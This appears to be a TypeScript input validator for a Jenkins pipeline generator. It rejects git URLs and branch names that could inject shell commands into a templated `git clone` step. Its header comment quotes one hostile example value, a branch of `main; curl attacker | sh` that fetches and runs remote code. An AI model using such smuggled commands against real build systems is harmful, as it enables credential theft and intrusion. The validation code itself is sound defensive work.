/**
 * The two customer-controlled strings every pipeline template pastes into a
 * Groovy `sh '''...'''` block: the git URL and the branch.
 *
 *     git clone --depth=1 --branch ${branch} ${gitUrl} .
 *
 * Nothing validated either before this file existed. A branch of
 * `main; curl attacker | sh` or a URL carrying a backtick ran on the build
 * agent with the platform's Jenkins credentials and the deployment-record
 * secret every job exports. The templates are string concatenation with no
 * quoting layer that could be trusted, so the fix is not to quote but to
 * refuse anything outside what a git ref or a repository URL can contain.
 *
 * Called at the top of every generator that takes (gitUrl, branch), so the
 * create route, the v1 redeploy route, the webhook and any future door are
 * all covered by the same rule.
 */

// A git ref: letters, digits, dot, underscore, slash, hyphen; no `..`, no
// `//`, no leading or trailing separator, no `@{`, no `.lock` suffix. That is
// git's own rule set minus the characters a shell cares about.
const BRANCH = /^[A-Za-z0-9][A-Za-z0-9._/-]{0,254}$/;

// https://host/path(.git) or git@host:path(.git). Hosts are DNS labels,
// paths are the same class as branches. No credentials in the URL, no query,
// no fragment, no whitespace, no shell metacharacters by construction.
const HTTPS_URL = /^https:\/\/[A-Za-z0-9][A-Za-z0-9.-]{0,253}(?::\d{1,5})?\/[A-Za-z0-9][A-Za-z0-9._/-]{0,511}$/;
const SSH_URL = /^git@[A-Za-z0-9][A-Za-z0-9.-]{0,253}:[A-Za-z0-9][A-Za-z0-9._/-]{0,511}$/;

export class PipelineInputError extends Error {
  readonly statusCode = 400;
  constructor(message: string) {
    super(message);
    this.name = "PipelineInputError";
  }
}

export function isValidBranch(branch: unknown): branch is string {
  return (
    typeof branch === "string" &&
    BRANCH.test(branch) &&
    !branch.includes("..") &&
    !branch.includes("//") &&
    !branch.includes("@{") &&
    !branch.endsWith("/") &&
    !branch.endsWith(".") &&
    !branch.endsWith(".lock")
  );
}

export function isValidGitUrl(url: unknown): url is string {
  return typeof url === "string" && (HTTPS_URL.test(url) || SSH_URL.test(url)) && !url.includes("..");
}

/** Throws PipelineInputError (400) unless both values are safe to paste into a shell block. */
export function assertPipelineInputs(gitUrl: unknown, branch: unknown): void {
  if (!isValidGitUrl(gitUrl)) {
    throw new PipelineInputError(
      "repository_url must be an https:// or git@ repository URL without credentials, query or unusual characters"
    );
  }
  if (!isValidBranch(branch)) {
    throw new PipelineInputError(
      "branch may contain only letters, digits, dot, underscore, slash and hyphen, and no `..`"
    );
  }
}
